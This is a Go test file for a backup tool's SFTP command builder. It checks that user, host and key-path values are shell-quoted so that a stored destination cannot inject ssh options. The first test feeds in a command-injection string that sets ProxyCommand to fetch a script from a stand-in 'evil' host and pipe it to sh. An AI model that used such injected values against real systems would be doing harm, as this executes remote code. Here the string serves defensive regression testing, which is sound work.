package backup

import (
	"strings"
	"testing"
)

// SFTPCommandFlag builds the `-o sftp.command=...` value restic tokenizes on
// whitespace and then executes. KeyPath was already shellQuote'd; user and host
// were interpolated raw via fmt.Sprintf("%s@%s"), so whitespace in either split
// into extra ssh argv entries — and `-o ProxyCommand=` runs through a shell.
//
// The API boundary now rejects these too, but this layer has to hold on its
// own: it is the last thing between a stored destination row and an exec.
func TestSFTPCommandFlag_QuotesUserAndHost(t *testing.T) {
	t.Parallel()

	flag := SFTPCommandFlag(SFTPInputs{
		User: "u -o ProxyCommand=curl http://evil/x|sh",
		Host: "example.com",
		Auth: "password",
		Path: "/backups",
	})
	if flag == "" {
		t.Fatal("expected a command flag for password auth")
	}

	// The injected options must not appear as free-standing tokens. If the
	// value were unquoted, "-o" and "ProxyCommand=..." would each be their own
	// argv entry once restic tokenizes on spaces.
	body := strings.TrimPrefix(flag, "sftp.command=")
	if !strings.Contains(body, "-l 'u -o ProxyCommand=curl http://evil/x|sh' -s -- example.com sftp") {
		t.Errorf("user was not quoted as a single token:\n%s", body)
	}
}

func TestSFTPCommandFlag_LeavesOrdinaryValuesUnquoted(t *testing.T) {
	t.Parallel()

	flag := SFTPCommandFlag(SFTPInputs{
		User: "bkp-user",
		Host: "backup.example.com",
		Auth: "password",
		Path: "/backups",
	})
	if !strings.HasSuffix(flag, " -l bkp-user -s -- backup.example.com sftp") {
		t.Errorf("ordinary user and host should pass through unquoted:\n%s", flag)
	}
}

// A whitespace-free value cannot split into extra argv entries, so shellQuote
// deliberately leaves it alone. Pinned so nobody "fixes" shellQuote into
// quoting everything and changes the flag for every existing destination.
func TestSFTPCommandFlag_KeyPathStillQuotedWhenSpaced(t *testing.T) {
	t.Parallel()

	flag := SFTPCommandFlag(SFTPInputs{
		User: "u", Host: "h", Auth: "key",
		KeyPath: "/etc/keys/my key.pem",
	})
	if !strings.Contains(flag, "'/etc/keys/my key.pem'") {
		t.Errorf("spaced key path lost its quoting:\n%s", flag)
	}
}
